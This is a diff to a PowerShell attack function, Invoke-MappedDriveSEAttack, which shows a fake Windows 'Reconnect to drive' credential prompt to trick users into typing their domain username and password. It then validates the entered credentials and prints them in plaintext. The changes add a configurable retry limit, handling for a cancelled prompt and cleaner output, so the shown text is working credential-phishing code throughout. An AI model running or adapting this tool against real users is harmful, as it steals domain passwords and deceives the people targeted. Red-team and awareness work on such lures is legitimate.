@@ -4,7 +4,9 @@ Function Invoke-MappedDriveSEAttack
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $true,Position = 1)]
-        [string]$Drive
+        [string]$Drive,
+        [Parameter(Mandatory = $false,Position = 2)]
+        [int]$retries = 3
 
     )
     <#
@@ -42,9 +44,9 @@ Function Invoke-MappedDriveSEAttack
             .Description Social engineering attack prompting users re-enter credentials for a mapped drive on their computer.
 
             .Example
-            Invoke-MappedDriveSEAttack -Drive R
+            Invoke-MappedDriveSEAttack -drive R -retries = 3
 	
-            Invoke-MappedDriveSEAttack -Drive T | Out-File C:\users\public\libraries\tmp.library-ms
+            Invoke-MappedDriveSEAttack -drive T -retries = 3 | Out-File C:\users\public\libraries\tmp.library-ms
     #>
 
     $ErrorActionPreference = 'SilentlyContinue'
@@ -68,7 +70,7 @@ Function Invoke-MappedDriveSEAttack
     function Error-BadCredentialsPrompt
     {
         $wshell = New-Object -ComObject Wscript.Shell
-        $wshell.Popup('Bad Username or Password',0,'Failed Authentication',0x5+0x10)
+        $wshell.Popup('Bad Username or Password',0,'Failed Authentication',0x0+0x10)
     }
 
     function Test-Credentials
@@ -92,16 +94,23 @@ Function Invoke-MappedDriveSEAttack
 	$Drive = $Drive + ':\'		
     $ValidCreds = $false
     $credentials = @()
+    $retryCount = 0
     Do
     {
 
-        $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
+        if($cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain))
+        {          
+        }else{
+            '!! User Canceled Prompt !!'
+            break
+        }
+
 				
         $UserDefDomain = $cred.GetNetworkCredential().Domain
         $username = $cred.GetNetworkCredential().UserName
         $password = $cred.GetNetworkCredential().Password
         $CurrentDomain = $env:UserDomain
-				
+        $UserCancel = $cred	
                 
         $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
                 
@@ -116,10 +125,10 @@ Function Invoke-MappedDriveSEAttack
                 Valid    = $false
             }
             $credentials += $credentialsTemp
-            $retry = Error-BadCredentialsPrompt
-            if($retry -eq 2)
-            {
-                '!! User exited erorr prompt without retry !!'
+            $retryCount++
+            if($retryCount -eq $retries){
+                $retryPrompt = Error-BadCredentialsPrompt
+                '[!!] Retry count Reached [!!]'
                 break
             }
         }
@@ -137,8 +146,11 @@ Function Invoke-MappedDriveSEAttack
         }
     }
     While($ValidCreds -eq $false)
-    '##Credentials##'
-    $credentials |
-    Select-Object -Property Domain, CredentialDomain, Username, Password, Valid |
-    Format-Table -AutoSize
+    if($credentials -ne $null)
+    {
+        '[##] Credentials [##]'
+        $credentials |
+        Select-Object -Property Domain, CredentialDomain, Username, Password, Valid |
+        Format-Table -AutoSize
+    }
 }
